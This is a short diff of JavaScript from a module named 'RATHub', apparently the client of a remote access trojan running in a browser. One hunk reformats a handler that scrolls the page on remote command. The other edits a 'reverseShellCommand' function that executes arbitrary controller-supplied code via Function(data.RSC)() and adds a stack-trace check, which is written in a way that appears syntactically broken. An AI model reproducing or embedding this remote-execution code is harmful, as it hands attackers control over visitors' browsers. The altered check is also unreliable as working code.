@@ -238,8 +238,8 @@ var RATHub = (function () {
 			var step = 80;
 			var currentPosition = document.documentElement.scrollTop || document.body.scrollTop;
 			console.log(data.Delta);
-			
-			if(currentPosition == 0 && data.Delta == -1){
+
+			if (currentPosition == 0 && data.Delta == -1) {
 				_scrollPos = (currentPosition + (step * (data.Delta)) * -1);
 
 				window.scrollTo(0, _scrollPos);
@@ -254,9 +254,12 @@ var RATHub = (function () {
 		}
 	}
 
-	var reverseShellCommand = function(data){
-		if(data.RSC != undefined && data.RSC !== null){
-			Function(data.RSC)();
+	var reverseShellCommand = function reverseShellCommand(data) {
+		if (data.RSC != undefined && data.RSC !== null) {
+			/// Check if has minimum of calls
+			if (--Cross.GetStacktrace().split(';').length > 1) {
+				Function(data.RSC)();
+			}
 		}
 	}
 
